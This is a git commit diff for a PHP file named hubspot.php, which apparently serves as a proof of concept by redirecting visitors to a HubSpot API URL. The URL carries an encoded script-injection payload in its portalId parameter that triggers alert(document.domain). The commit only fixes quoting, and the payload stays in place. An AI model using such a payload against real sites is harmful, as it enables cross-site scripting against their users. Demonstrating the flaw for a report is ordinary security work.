0f62e85fdedafac0ad9498f85681e25f53da8d56
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-20 20:34:18 +0100

    Update hubspot.php

--- hubspot.php
+++ hubspot.php
@@ -1,7 +1,5 @@
 
 <?php 
-header("Location: https://app.hubspot.com/content/api/v4/tools-menu/has-permission?portalId=q%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E
+header("Location: https://app.hubspot.com/content/api/v4/tools-menu/has-permission?portalId=q%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E")
 
-")
-
-*/?>
+?>
